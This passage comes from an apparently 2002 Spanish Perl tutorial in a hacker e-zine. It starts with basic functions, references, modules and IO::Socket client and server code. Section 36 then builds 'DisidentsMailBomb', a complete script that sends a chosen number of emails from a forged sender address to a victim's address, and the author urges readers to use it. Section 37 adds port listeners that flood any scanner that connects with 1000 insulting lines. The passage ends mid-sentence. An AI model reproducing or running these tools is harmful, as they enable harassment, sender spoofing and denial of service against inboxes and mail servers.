  el  numero que especifiques, salvo que le especifiques que solo genere en-
  teros, veamos como es el tema:


  Ejemplo:

   #!/usr/bin/perl
   print rand(59), "\n"; #genera un numero aleatorio entre 0 y 59


  SALIDA:

   [root@localhost articulo]# perl rand1.pl
   31.9958490423553

   [root@localhost articulo]# perl rand1.pl
   58.6096578949757



* Ahora en el mismo programa solo quiero que genere numeros enteros,  y para
  ello usaremos int:

  Ejemplo:

   #!/usr/bin/perl
   print int(rand(59)), "\n";


  SALIDA:

   [root@localhost articulo]# perl rand3.pl
   44

   [root@localhost articulo]# perl rand3.pl
   35



- Permisos de ficheros -

- En ocasiones nos gustaria cambiar  los permisos de los ficheros, para cam-
  biarlos usaremos la funcion chmod (), pero de una forma muy  especial  se-
  ria algo asi:


  Ejemplo:

   #!/usr/bin/perl
   chmod(0755, nombredearchivo);  #vemos que  se pone  un 0 delante  de  los
                                  #valores en octal



- Tambien es posible hacerlo a un grupo de ficheros metidos en un array

  Ejemplo:

   $cambiandopermisos= chmod (755, @ficheros);


- Calcular la raiz cuadrada con sqrt:

  La sintaxis es:  srand expresion


  Ejemplo:

   #!/usr/bin/perl
   $numero = 4;
   $raizcuadrada= sqrt $numero;
   print "$raizcuadrada\n";


  SALIDA:

   [root@localhost articulo]# perl srand.pl
   2


- Tambien podemos ver mas conversiones por ej a ASCII

  * Para ello usaremos org, asi:

  Ejemplo:

   #!/usr/bin/perl
   $ord =ord("~");
   print "$ord\n";


  SALIDA:

   [root@localhost articulo]# perl ord.pl
   126


* Y la forma contraria con chr

  Ejemplo:

   #!/usr/bin/perl
   $ord =chr("126");
   print "$ord\n";


  SALIDA:

   [root@localhost articulo]# perl chr.pl
   ~


- Para hayar e elevado a cualquier potencia usaremos exp:


  Ejemplo:

   #!/usr/bin/perl
   $salida= exp 2;
   print "$salida\n";


  SALIDA:

   [root@localhost articulo]# perl exp.pl
   7.38905609893065


- Veamos como se eleva un numero a otra potencia, para ello usaremos **:


  Ejemplo:

   #!/usr/bin/perl
   $numero=4;
   $potencia=2;
   $salida= ($numero ** $potencia);
   print "$salida\n";


  SALIDA:

   16




- Division -

  Ejemplo:

   #!/usr/bin/perl
   $numero1=4;
   $numero2=2;
   $salida= ($numero1 / $numero2);
   print "$salida\n";


  SALIDA:

   2



- Multiplicacion -

  Ejemplo:

   #!/usr/bin/perl
   $numero1=4;
   $numero2=2;
   $salida= ($numero1 * $numero2);
   print "$salida\n";


   SALIDA:

    8


- Suma -

  Ejemplo:

   #!/usr/bin/perl
   $numero1=4;
   $numero2=2;
   $salida= ($numero1 + $numero2);
   print "$salida\n";


  SALIDA:

   6


- Resta -

  Ejemplo:
   #!/usr/bin/perl
   $numero1=4;
   $numero2=2;
   $salida= ($numero1 - $numero2);
   print "$salida\n";



  SALIDA:

   2

- Como sacar el resto -

* Para  ello usaremos el operador %

  Ejemplo:
   #!/usr/bin/perl
   $numero1=4;
   $numero2=2;
   $salida= ($numero1 % $numero2);
   print "$salida\n";


  SALIDA:

   0





- VALORES ABSOLUTOS -


* Con el operador abs nos devuelve un numero en valor absoluto, veamos  como
  funciona:

  Ejemplo:

   #!/usr/bin/perl
   $salida = abs (-4);
   print "$salida\n";


  SALIDA:

   4







.==========================================================================.
|=======~ 28.0.0 COLORES ~==================================================
|===========================================================================


- Puede darse el caso, que queramos cambiar el color de lo que imprimamos en
  pantalla en un programa, veremos que facil se  imprimen  con el color  que
  queramos un texto, ej:


  Ejemplo:
   #!/usr/bin/perl
   use Term::ANSIColor; #Usamos el modulo Term::ANSIColor
   print color("white"), "blanco\n", color("reset");
   print color("blue"), "azul\n", color("reset");
   print color("red"), "rojo\n", color("reset");
   print color("yellow"), "amarillo\n", color("reset");
   print color("green"), "verde\n", color("reset");








.==========================================================================.
|=======~ 29.0.0 REFERENCIAS ~==============================================
|===========================================================================


- El concepto de referencia lo podriamos denominar como un puntero, referen-
  ciar sirve para hacer referencia a otra variable y usar su valor:


- CREANDO UNA REFERENCIA A UNA VARIABLE:

  Ejemplo:

   #!/usr/bin/perl
   $nombre = 'DDiego';
   $nombreref= \$nombre; #la variable $nombreref contiene la referencia de
                         #$nombre


* Tambien un array puede hacer referencia a varias variables o a otros arra-
  ys:

  Ejemplo:

   #!/usr/bin/perl
   $nombre= 'Diego';
   $nick= 'DDiego';
   $team='Disidents';
   $web='http://www.disidents.int-ltd.com';
   @arrayref=(\$nombre,\$nick,\$team,\$web);





- CREANDO UNA REFERENCIA A UNA SUBRUTINA


  Ejemplo:

   #!/usr/bin/perl
   sub saludo {
               print "hola\n";
              }
   $refsub = \&saludo;










.==========================================================================.
|=======~ 30.0.0 CRYPT ~====================================================
|===========================================================================


- Crypt es un sistema estandar  que utiliza  unix para cifrar claves,  crypt
  utiliza dos argumentos el primero puede ser una cadena a cifrar y un valor
  que puede elegirse de forma arbitraria sirve para la eleccion de  las  256
  posibles combinaciones que puede tomar crypt, ej:


  Ejemplo:

   #!/usr/bin/perl
   $cadena= "DDiego";
   $salida = crypt $cadena,2;
   print "$salida\n";


  SALIDA:

   22eFJ/65nEWH.







.==========================================================================.
|=======~ 31.0.0 GETC ~=====================================================
|===========================================================================


- La funcion getc, recoge el primer caracter que introduzcas por teclado, es
  facil de usar:


  Ejemplo:

   #!/usr/bin/perl
   print "Escribe algo: ";
   $salida= getc(STDIN);
   print "$salida\n";


  SALIDA:

   [root@localhost articulo]# perl  getc.pl
   Escribe algo: hola
   h








.==========================================================================.
|=======~ 32.0.0 GMTIME ~===================================================
|===========================================================================


- Ahora veremos la funcion gmtime, para saber la fecha, hora, segundos segun
  la  hora estandar de Greenwitch veamos como funciona


  Ejemplo:

   #!/usr/bin/perl
   ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$dst)=gmtime(time);
   print "$sec\n";  #segundos
   print "$min\n";  #minutos
   print "$hour\n"; #hora
   print "$dst\n";  #hora de ahorro de luz diurna (Daylight Saving Time)
   print "$year\n"; #año
   print "$mon\n";  #desde  0 a 11, mes como estamos en enero saldra 0
   print "$wday\n"; #dia de la semana
   print "$yday\n"; #fecha de ayer
   print "$mday\n"; #fecha de hoy



  SALIDA:

   [root@localhost articulo]# perl gmtime.pl
   21
   41
   22
   0
   102
   0
   1
   27
   28








.==========================================================================.
|=======~ 33.0.0 LOCALTIME ~================================================
|===========================================================================


- localtime tambien contiene estos elementos, lo podriamos asi:


  Ejemplo:

   #!/usr/bin/perl
   ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime(time);
   print "$sec\n";
   print "$min\n";
   print "$hour\n";
   print "$isdst\n";
   print "$year\n";
   print "$mon\n";
   print "$wday\n"; #dia de la semana
   print "$yday\n"; #fecha de ayer
   print "$mday\n"; #fecha de hoy



  SALIDA:

   [root@localhost articulo]# perl localtime.pl
   18
   2
   18
   0
   102
   0
   1
   27
   28





.==========================================================================.
|=======~ 34.0.0 MODULOS EN PERL ~==========================================
|===========================================================================


- En perl gracias a una cosa llamadas modulos, paquetes o librerias que  nos
  van a hacer la vida mas facil a la hora  de crear programas. Para usar  un
  modulo podemos usar use o require.



- COMO SE USAN -

- require:

   require nombredemodulo;


* O si quieres especificar la ubicacion:

   require 'archivo.pm';



- use:

   use nombredemodulo;



- Use y require se diferencia en que las instruciones use son  ejecutadas  e
  interpretadas en ese momento,  y con require  son importadas  en tiempo de
  ejecucion.



- EVITAR USO DE UN MODULO -

* Para ello usaremos la intruccion "no" ,que es lo contrario a use




- USAR OTROS PROGRAMAS DE PERL -


- Gracias a require, podemos usar otros programas de perl y compartir varia-
  bles y todo lo que te puedas imaginar, para comprobarlo vamos a  crear dos
  programas, muy simples:

  Ejemplo:


   # script.pl sera donde meteremos un  programa muy  simple y  llamaremos a
   # libreria.pl donde estan las variables

   #!/usr/bin/perl
   #############
   # script.pl #
   #############


   require 'libreria.pl'; #Aqui meteremos las variables que usamos

   print "Nombre es: $nombre \n";
   print "Apellido es: $apellido\n";



   ###############
   # libreria.pl #
   ###############

   #!/usr/bin/perl

   $nombre = "Juan";
   $apellido = "Perez";



  SALIDA:

   [root@localhost prueba]# ./require.pl
   Nombre es: Juan
   Apellido es: Perez


* Bien ahora podemos usar cosas de otros programas.








.==========================================================================.
|=======~ 35.0.0 MODULO IO::Socket ~========================================
|===========================================================================


- Venga llega la hora de conectarnos a inet, ya aburridos de tanta  cadena y
  mierda, la perl trae un paquete o modulo llamado "IO::Socket" que nos va a
  ayudar mucho a hacer herramientas de  manera muy facil, solo tenemos  que
  declarar que vamos a usarlo al principio del script con use IO::Socket;





.==========================================================================.
|=======~ 35.1.0 CLIENTE ~==================================================
|===========================================================================


- Veamos un ejemplo, facil de comprender:

  Ejemplo:
   #!/usr/bin/perl
   use IO::Socket;
   $sock = new IO::Socket::INET (PeerAddr => 'www.terra.es', #donde vamos a
                                                             #conectar

                                 PeerPort => 80,           #puerto donde
                                                           #vamos a conectar

                                 Proto    => 'tcp');       #protocolo que
                                                           #vamos a usar


* Ahora ya podemos enviar informacion a www.terra.es como clientes









.==========================================================================.
|=======~ 35.2.0 SERVIDOR ~=================================================
|===========================================================================


- Ahora vamos a prepararnos para recinir conexiones:

  Ejemplo:
   #!/usr/bin/perl
   use IO::Socket;
   $sock = new IO::Socket::INET (LocalHost => 'mihost';
                                 LocalPort => 1100,
                                 Proto     => 'tcp',
                                 Listen    =>  6,   #Tamaño de la cola para
                                                    #escuchar las peticiones

                                 Reuse     => 1     #Verifica si hay una
                                                    #conexion activa
                                );

   $SOCKET= $sock -> accept(); #Ahora aceptamos las conexiones

   #ahora  usaremos getpeername $descriptordelsocket y veremos quien se
   #conecta


   print "$conexion \n";


- Si pusiesemos asi esto obtendriamos al hacer un telnet al 1100 esto:


  SALIDA:
   [root@localhost arti]# perl server.pl
   IO::Socket::INET=GLOB(0x811579c)


- Y si queremos recibir la "direccion ip" de la maquina remota usaremos esto
  combinado con "inet_ntoa"  y la extructura  "sockaddr_in" empaquetada  que
  la podremos  extraer gracias a unpack asi:


print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $conexion))[1])," \n";


* Saldria algo asi ahora:


  SALIDA:

   [root@localhost arti]# perl server.pl
   Conexion desde: 127.0.0.1



- Cerrar el socket:

   Sintaxis: shutdown $descriptorsocket, HOW


- HOW puede tener varios valores:

   0  no se puede recibir datos
   1  no se puede enviar  enviar
   2  no se puede ni enviar ni recibir  datos

 Ejemplo:  shutdown(SOCKET, 0); # no se puede recibir datos




- Ahora vamos a  mandar un mensaje al que se conecte, con print -


Seria algo asi:

  Ejemplo:

   #!/usr/bin/perl
   use IO::Socket;
   $sock = new IO::Socket::INET (LocalHost => 'localhost',
                                 LocalPort => 1100,
                                 Proto     => 'tcp',
                                 Listen    =>  6,
                                 Reuse     => 1
                                );
   die "No se ha podido crear el socket: $!\n" unless $sock;
   $conexion= $sock -> accept(); #Ahora aceptamos las conexiones
   print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $conexion))[1])," \n";
   print $conexion "Hola DDiego\n"; #El mensaje que le enviaremos usando print
   $conexion->send("Hola\n"); #Otro mensaje que enviaremos usando send
   close ($conexion);




  SALIDA:

- Desde  el server -

   [root@localhost arti]# perl server.pl
   Conexion desde: 127.0.0.1


- Desde el cliente -

   [root@localhost /]# telnet localhost 1100
   Trying 127.0.0.1...
   Connected to localhost.localdomain.
   Escape character is '^]'.
   Hola DDiego
   Hola
   Connection closed by foreign host.




- Es posible imprimir un texto en pantalla facilmente -

  Seria algo asi:

   open (ARCHIVO ,"archivo.txt");
   print $conexion (<ARCHIVO>);#de  la  misma forma  que  enviamos  mensajes
                               #podemos enviar archivos  en este caso un txt



* Cuando  se  crea  el  objeto  IO::Socket::INET  se pueden  poner  diversas
  opciones:

    PeerAddr ip_o_host:puerto #el puerto es opcional  porque se  puede poner
                              #despues

    Peerport tipo_de_servicio(puerto) #puedes e specificar  el  puerto
                                      #directamente o poner
                                      #algo asi http(80) o ftp(21) o
                                      #directamente 21

    LocalAddr nombre_del_host:puerto #nombre  del host  local y  puerto
                                     #local es opcional

    Localport 'puertolocal'  #Se puede poner tambien el nombre del  servicio
                             #pero es opcional

    Type  SOCK_STREAM | SOCK_DGRAM | etc  #Es opcional si pones el protocolo
                                          #tcp o udp ya los identifica

    Proto  'tcp' | 'udp'| etc   #protocolo que vamos a utilizar



- Como recibir un mensaje del socket, con recv:


  Ejemplo:

   #!/usr/bin/perl
   use IO::Socket;
   $sock = new IO::Socket::INET (LocalHost => 'localhost',
                                 LocalPort => 1100,
                                 Proto     => 'tcp',
                                 Listen    =>  6,
                                 Reuse     => 1
                                );
   die "No se ha podido crear el socket: $!\n" unless $sock;
   $conexion= $sock -> accept(); #Ahora aceptamos las conexiones
   print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $conexion))[1])," \n";
   $conexion->send("Como te llamas??\n"); #Otro mensaje que enviaremos
                                          #usando send
   $conexion->recv($line, 80); #metemos el mensaje en $line y con un buffer
                               #de 80 caracteres 80 bytes
   print "$line\n";
   close ($conexion);


- Siempre hay mas formas:

  Ejemplo:

   #!/usr/bin/perl
   $respuesta=$conexion;
   print "$respuesta";  #con esto recibes lo que manda el cliente


o

   while (<$conexion>) { print; }  #con esto recibes lo que manda el cliente











.==========================================================================.
|=======~ 36.0.0 CREANDO UN MAIL BOMBER ~===================================
|===========================================================================


- Para crear un programa de este estilo,  primero tendremos que aprender  a
  crear un  cliente de mail,  bueno espero  que  sabreis que saldra la ip de
  quien mando el mensaje, vosotros sabreis como usar  otra podeis leer algun
  metodo en la ezine anterior en el articulo de Rah3.

  Para hacer un cliente de mail usaremos el modulo Net::SMTP pasaros aqui si
  quereis ( http://www.perldoc.com/perl5.6.1/lib/Net/SMTP.html ), o sino se-
  guid leyendo, es muy facil hacerlo:

   Ejemplo:

         #!/usr/bin/perl
         use Net::SMTP; #Modulo que necesitamos

         $smtp = Net::SMTP->new('smtp.wanadoo.es',   #creamos el nuevo objeto$smtp
                                Hello => 'smtp.wanadoo.es',  #Algunos servidores necesitan que les saludes
                                Timeout=> 25,#Tiempo maximo de espera para que te responda el server por defecto 120
                                Debug   => 1, #Para ver la respuesta  interesante si quieres ver como funciona
                                );

         die "No se ha podido conectar al servidor $servidorSMTP" unless $smtp;
         print $smtp->domain,"\n";  #imprime el nombre de dominio
         $smtp->mail("jajajaj\@yahoo.es"); #mi mail
         $smtp->to('ddiegodisid@yahoo.es');    #mail a quien mandas, fijaros en el detalle que con
                                               #comillas simples  no necesitas poner /@

         $smtp->data();  #comienza el mensaje
         $smtp->datasend("To: Administrador\n");
         $smtp->datasend("From:server\n");
         $smtp->datasend("Subject:hola prueba\n"); #asunto
         $smtp->datasend("Pruebassssss\n"); #Mandamos este mensaje
         $smtp->dataend();  #termina el mensaje
         $smtp->quit();#nos piramos



   SALIDA:

    [root@localhost mail]# perl mailclient.pl

    Net::SMTP: Net::SMTP(2.15)
    Net::SMTP:   Net::Cmd(2.18)
    Net::SMTP:     Exporter(5.562)
    Net::SMTP:   IO::Socket::INET(1.25)
    Net::SMTP:     IO::Socket(1.26)
    Net::SMTP:       IO::Handle(1.21)

    Net::SMTP=GLOB(0x8192508)<<< 220 (wanadoo.es) ESMTP Welcome to our ESMTP server.
    Net::SMTP=GLOB(0x8192508)>>> EHLO smtp.wanadoo.es
    Net::SMTP=GLOB(0x8192508)<<< 250-smtp.wanadoo.es Hello ****************.es [xx.xx.130.56], pleased to meet you
    Net::SMTP=GLOB(0x8192508)<<< 250-ENHANCEDSTATUSCODES
    Net::SMTP=GLOB(0x8192508)<<< 250-8BITMIME
    Net::SMTP=GLOB(0x8192508)<<< 250-SIZE 536870912
    Net::SMTP=GLOB(0x8192508)<<< 250-DSN
    Net::SMTP=GLOB(0x8192508)<<< 250-ONEX
    Net::SMTP=GLOB(0x8192508)<<< 250-XUSR
    Net::SMTP=GLOB(0x8192508)<<< 250 HELP
    (wanadoo.es)
    Net::SMTP=GLOB(0x8192508)>>> MAIL FROM:<jajajaj@yahoo.es>
    Net::SMTP=GLOB(0x8192508)<<< 250 2.1.0 <jajajaj@yahoo.es>... Sender ok
    Net::SMTP=GLOB(0x8192508)>>> RCPT TO:<ddiegodisid@yahoo.net>
    Net::SMTP=GLOB(0x8192508)<<< 250 2.1.5 <ddiegodisid@yahoo.net>... Recipient ok
    Net::SMTP=GLOB(0x8192508)>>> DATA
    Net::SMTP=GLOB(0x8192508)<<< 354 Enter mail, end with "." on a line by itself
    Net::SMTP=GLOB(0x8192508)>>> To: Administrador
    Net::SMTP=GLOB(0x8192508)>>> From:server
    Net::SMTP=GLOB(0x8192508)>>> Subject:hola prueba
    Net::SMTP=GLOB(0x8192508)>>> Pruebassssss
    Net::SMTP=GLOB(0x8192508)>>>
    Net::SMTP=GLOB(0x8192508)>>> .
    Net::SMTP=GLOB(0x8192508)<<< 250 2.0.0 g07JGIa07621 Message accepted for delivery
    Net::SMTP=GLOB(0x8192508)>>> QUIT
    Net::SMTP=GLOB(0x8192508)<<< 221 2.0.0 smtp.wanadoo.es closing connection


* Esto sale gracias a que usamos la opcion debug, vemos que el mail ha  sido
  mandado


-> Message accepted for delivery bieennnn


* Jojojo  ahora  llega el  motor del mail  bomba,  con  un  simple bucle  lo
  pasaremos bene.


  Ejemplo:

   #!/usr/bin/perl
   use Net::SMTP; #Modulo que necesitamos
   for ($a=1;$a<=1000;$a++) {    #creas el bucle y ya  esta
         $smtp = Net::SMTP->new('smtp.wanadoo.es',   #creamos el nuevo objeto$smtp
                                Hello => 'smtp.wanadoo.es',  #Algunos servidores necesitan que les saludes
                                Timeout=> 25,#Tiempo maximo de espera para que te responda el server por defecto 120
                                );

         die "No se ha podido conectar al servidor $servidorSMTP" unless $smtp;
         print "Enviado mensaje nº $a\n";
         $smtp->mail('jajajaj@yahoo.es'); #el mail con que voy a mandar
         $smtp->to('jojojo@eresmas.com');    #mail a quien mandas al mio no please
         $smtp->data();  #comienza el mensaje
         $smtp->datasend("To: Administrador\@yahoo.es\n");
         $smtp->datasend("From:jojojo@eresmas.com\n");
         $smtp->datasend("Subject:hola prueba\n"); #asunto
         $smtp->datasend("Mailbomba de disidents\n"); #Mandamos este mensaje
         $smtp->datasend("\n");
         $smtp->dataend();  #termina el mensaje
         $smtp->quit();#nos piramos
       }



  SALIDA:

   [root@localhost mail]# perl disidentsmail.pl
   Enviado mensaje nº 1
   Enviado mensaje nº 2
   Enviado mensaje nº 3
   Enviado mensaje nº 4
   Enviado mensaje nº 5
   Enviado mensaje nº 6

   ....


   Enviado mensaje nº 1000
   [root@localhost mail]#


- Pura diversion no quiero oir a nadie los programas mailbomba no funcionan,
  a que esperas a usar este xDD si no preguntadle a XanKaiSen que me facili-
  to su mail para enviarle unos cuantos.


* Veamos como quedaria un poco mas bonito y mejor:



<++> disidentsmailbomb.pl


#!/usr/bin/perl
#########################################################################################################
# PROGRAMA: DisidentsMailBomb v. 1.0                                                                    #
# AUTOR:    DDiego                                                                                      #
# MAIL:     DDiegodisid@yahoo.es                                                                        #
# URL:      http:www.disidents.int-ltd.com                                                              #
# MAILTEAM: Disisidents@yahoo.es                                                                        #
# Uso:      disidentsmailbomb.pl [mail de mentira] [victim mail] [smtp server]  [nº de mails] [+d | -d] #
#########################################################################################################


print " ################################################ \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " #    ø   DisidentsMailBomb v.1.0 by DDiego  ø  #        ø ø\n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  #       ø ø ø          BOMB!!! ;D \n";
print " ################################################        ø ø ......**** \n";



use Net::SMTP; #Modulo que necesitamos
die "sintaxis: $0 [mail de mentira] [mail de la victima] [servidor smtp] [nº de mails] [+d | -d]
Escriba $0 --help para mas ayuda\n" unless ($ARGV[0]);

if ($ARGV[0] eq "--help") {
                           &ayuda;
                          } else {

if ($ARGV[4] eq "+d")     {
                           $ARGV[4]=1; #Habilitado el modo debug
                          } elsif ($ARGV[4] eq "-d") {
                                                      $ARGV[4]=0; #Deshabilitado el modo debug
                                                     }

for ($a=1;$a<=$ARGV[3];$a++) {    #creas el bucle y ya  esta
         $smtp = Net::SMTP->new($ARGV[2],   #creamos el nuevo objeto$smtp
                                Hello => $ARGV[2],  #Algunos servidores necesitan que les saludes
                                Timeout=> 25,#Tiempo maximo de espera para que te responda el server por defecto 120
                                Debug   => $ARGV[4]
                                );

         die "No se ha podido conectar al servidor $servidorSMTP" unless $smtp;
         print "Enviado mensaje nº $a\n";
         $smtp->mail($ARGV[0]); #el mail con que voy a mandar
         $smtp->to($ARGV[1]);    #mail a quien mandas al mio no please
         $smtp->data();  #comienza el mensaje
         $smtp->datasend("To: $ARGV[1]\n"); #para
         $smtp->datasend("From: $ARGV[0]\n"); #desde
         $smtp->datasend("Subject:hola perro\n"); #asunto
         $smtp->datasend("Mailbomba de disidents\n"); #Mandamos este mensaje
         $smtp->datasend("\n");
         $smtp->dataend();  #termina el mensaje
         $smtp->quit();#nos piramos
 } #Cierre de for
}  #cierre de else


  ##################
  # Parte de ayuda #
  ##################

  sub ayuda {
              print "[mail de mentira]:    Inventate un mail, es el que vera la victima cuando mire alguno de los miles\n";
              print "                      de mails que le envies \n";
              print "[mail de la victima]: Esta calro de quien sera el mail no xDD\n";
              print "[servidor smtp]:      Servidor para enviar mails smtp, usa el que quieras\n";
              print "[nº de mails]:        Numero de mails a enviar\n";
              print "[+d | -d]:            Modo depuracion o debug, para ver en que paso falla el envio \n\n\n";
            }

print "                                                            ------------------------------------------------\n";
print "                                                            - Disidents Hacker Team - 2002                 -\n";
print "                                                            - Webpage:  http://www.disidents.int-ltd.com   -\n";
print "                                                            - Autor:    DDiego                             -\n";
print "                                                            - Mail:     DDiegodisid\@yahoo.es              -\n";
print "                                                            - Mailteam: Disidents\@yahoo.es                -\n";
print "                                                            ------------------------------------------------\n";




<-->


- Cuiadooooooooo con esto que ya os veo venirrrrrr













.==========================================================================.
|=======~ 37.0.0 CREANDO UN MONITOR DE PUERTOS ~============================
|===========================================================================


- Bueno sabiendo esto podemos ya crear nuestro propio monitor de puertos,  y
  si nos scanean  imprimir  un pequeño mensaje de bienvenida y unos cuantos,
  empezaremos haciendo un monitor de puertos basico y mejorandolo poco a po-
  co.


 Vamos a crear un socket que escuche por el puerto 27374  y imprima la frase
 Hola cacho CABRON cada vez  que  alguien se conecte xDD.


  Ejemplo:

   #!/usr/bin/perl
   use IO::Socket;

        #Creando socket



   $socket = IO::Socket::INET->new( Proto     => 'tcp',
                                    LocalPort => '27374',
                                    Listen    => 6,
                                    Reuse     => 1);

   die "No se ha podido crear el socket" unless $socket;


        #Comenzando la conexion

        print "-------------------------------------------------\n";
        print "-         Disidentsportmonitor ONLINE           -\n";
        print "-------------------------------------------------\n";
        my ($conexion, $buf);
       while ($conexion = $socket->accept()) {
           $conexion->autoflush(1); #autoflush sirve para crear un buffer temporal que se vacia
                                    #de forma periodica se le da un valor  distinto de 0 que
                                    #significa q se vaciara de forma automatica
         print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $conexion))[1])," \n";
         $servidor=inet_ntoa((unpack_sockaddr_in(getpeername $conexion))[1]);


       #PARTE DE MANDAR MENSAJES

        print  "MANDANDO MENSAJE to $servidor - ";

               print $conexion "Hola cacho CABRON\n";#Mensaje que enviara al servidor


        print "OK \n\n";
        close $conexion; #cerramos la conexion con el host
        print "conexion cerrada con $servidor \n\n";

       }




- Ahora supongamos que queremos  enviar mas de un mensaje al que se  conecte
  por ej 1000 mensajes para ello solo tendriamos que  usar for:



        #PARTE  DE MANDAR MENSAJES

        print  "MANDANDO MENSAJES to $servidor - ";

                for($a=1;$a<=1000;$a++)  #mandemosle 1000 veces la frase
                             {
                             print $conexion "Hola cacho CABRON\n";
                             }

        print "OK \n";
        close $conexion; #cerramos la conexion con el host
        print "conexion cerrada con $servidor \n\n";

       }



* Estamos viendo  que solo  acepta una conexion, para  que acepte mas de un
  cliente usaremos el modulo IO::Select, veremos  como funciona:



#!/usr/bin/perl
##############################################
# PROGRAMA: Disidentsportmonitor 1.0 BETA    #
# AUTOR:    DDiego                           #
# MAIL:     DDiegodisid@yahoo.es             #
# URL:      http:www.disidents.int-ltd.com   #
# MAILTEAM: Disidents@yahoo.es               #
##############################################

use IO::Socket;
use IO::Select;  #Cargamos el modulo IO::Select
        #Creando socket



$socket = IO::Socket::INET->new( Proto     => 'tcp',
                                 LocalPort => '27374',
                                 Listen    => 6,
                                 Reuse     => 1);

        die "No se ha podido crear el socket" unless $socket;

        print "-------------------------------------------------\n";
        print "-         Disidentsportmonitor ONLINE           -\n";
        print "-------------------------------------------------\n";
        $select = new IO::Select( $socket );
         while(@ready = $select->can_read ) {
             foreach $conexion (@ready) {
          if($conexion == $socket) {
                       #Ahora crearemos el socket nuevo
           $nuevosocket = $socket->accept;
                     $select->add($nuevosocket); #añade el nuevo socket abierto
                     $nuevosocket->autoflush(1); #autoflush sirve para crear un buffer temporal que se vacia
                                    #de forma periodica se le da un valor  distinto de 0 que
                                    #significa q se vaciara de forma automatica


         print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $nuevosocket))[1])," \n";
         $servidor=inet_ntoa((unpack_sockaddr_in(getpeername $nuevosocket))[1]);



        print  "MANDANDO MENSAJES to $servidor - ";

                for($a=1;$a<=1000;$a++)  #mandemosle 1000 veces la frase si pones ;; ya sabes ;)
                             {
                             print $nuevosocket "Hola cacho CABRON\n";
                             }

        print "OK \n";

       }#cierre if
    } #Cierre foreach
 }#Cierre while






- Ahora que queremos hacer algo mas serio por ejemplo que cuando se conecten
  a ti, automaticamente te envien  un mail a una direccion de correo que  tu
  elijas con la ip que ha conectado a que hora  y ficha, en unos segundos se
  enviara el mail, y el host que se conecto perdera la conexion.



#!/usr/bin/perl
##############################################
# PROGRAMA: Disidentsportmonitor 1.0         #
# AUTOR:    DDiego                           #
# MAIL:     DDiegodisid@yahoo.es             #
# URL:      http:www.disidents.int-ltd.com   #
# MAILTEAM: Disidents@yahooes                #
##############################################

use IO::Socket;
use Net::SMTP; #Modulo que necesitamos para avisar por mail al admin

$socket = IO::Socket::INET->new( Proto     => 'tcp',  #Protocolo
                                 LocalPort => '27374',#Puerto a la escucha
                                 Listen    => 6,
                                 Reuse     => 1);

        die "No se ha podido crear el socket" unless $socket;


        #Comenzando la conexion

        print "-------------------------------------------------\n";
        print "-         Disidentsportmonitor ONLINE           -\n";
        print "-------------------------------------------------\n";
        my ($conexion, $buf);
       while ($conexion = $socket->accept()) {
           $conexion->autoflush(1); #autoflush sirve para crear un buffer temporal que se vacia
                                    #de forma periodica se le da un valor  distinto de 0 que
                                    #significa q se vaciara de forma automatica
         print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $conexion))[1])," ";
         $servidor=inet_ntoa((unpack_sockaddr_in(getpeername $conexion))[1]);
         $hora=localtime();
         print  "=> $hora\n";

         #parte del mail  de aviso

         $smtp = Net::SMTP->new('smtp.wanadoo.es',   #creamos el nuevo objeto$smtp
                                Hello => 'smtp.wanadoo.es',  #Algunos servidores necesitan que les saludes
                                Timeout=> 25,#Tiempo maximo de espera para que te responda el server por defecto 120
                                 #si te falla el nvio del mail habilita el modo->  Debug   => 1,
                                );

         die "No se ha podido conectar al servidor $servidorSMTP" unless $smtp;
         print "Enviando mensaje\n";
         $smtp->mail("aviso\@yahoo.es"); #el mail con que voy a mandar
         $smtp->to('tumail@yahoo.es');    #mail a quien mandas al mio no please
         $smtp->data();  #comienza el mensaje
         $smtp->datasend("To: tumail\@yahoo.es\n");
         $smtp->datasend("From:aviso\@yahoo.es\n");
         $smtp->datasend("Subject:Escaneo\n"); #asunto
         $smtp->datasend("Conexion con ip: $servidor a $hora\n"); #Mandamos este mensaje
         $smtp->dataend();  #termina el mensaje
         $smtp->quit();#nos piramos
         print "Mensaje enviado\n";

        close $conexion; #cerramos la conexion con el host

       }

* Asi de facil


- Jo y nos damos cuenta de una cosa con nuestro portmonitor, que pasaria  si
  hubiera mas de una  conexion a la vez??, pues que nuestro socket no podria
  responder a todos y no podriamos aceptar su conexion ni descubrir quien es
  , para ello usaremos el modulo "use IO::Select", y asi podremos crear  mas
  sockets a la vez para recibir mas clientes en nuestra maquina,  veamos  un
  poco de code:


#!/usr/bin/perl
################################################
# PROGRAMA: Disidentsportmonitor 1.1 multiplex #
# AUTOR:    DDiego                             #
# MAIL:     DDiegodisid@yahoo.es               #
# URL:      http:www.disidents.int-ltd.com     #
# MAILTEAM: Disidents@yaho.es                  #
################################################

use IO::Socket;
use IO::Select;  #Cargamos el modulo IO::Select

        #Creando socket

$socket = IO::Socket::INET->new( Proto     => 'tcp',
                                 LocalPort => '1100',
                                 Listen    => 6,
                                 Reuse     => 1);

        die "No se ha podido crear el socket" unless $socket;

        print "-------------------------------------------------\n";
        print "-         Disidentsportmonitor ONLINE           -\n";
        print "-------------------------------------------------\n";
        $select = new IO::Select( $socket );
         while(@ready = $select->can_read ) {
             foreach $conexion (@ready) {
          if($conexion == $socket) {
                       #Ahora crearemos el socket nuevo
        while   ($nuevosocket = $socket->accept()) {
                     $select->add($nuevosocket); #añade el nuevo socket abierto
                     $nuevosocket->autoflush(1); #autoflush sirve para crear un buffer temporal que se vacia
                                    #de forma periodica se le da un valor  distinto de 0 que
                                    #significa q se vaciara de forma automatica


         print "Conexion desde: ",inet_ntoa((unpack_sockaddr_in(getpeername $nuevosocket))[1])," \n";

        close $nuevosocket;
       }#cierre if
    } #Cierre foreach
 }#Cierre while
} #cierre 2º while



- Umm ahora añadiremos lo de enviar mails , << y trabajara conjuntamente con
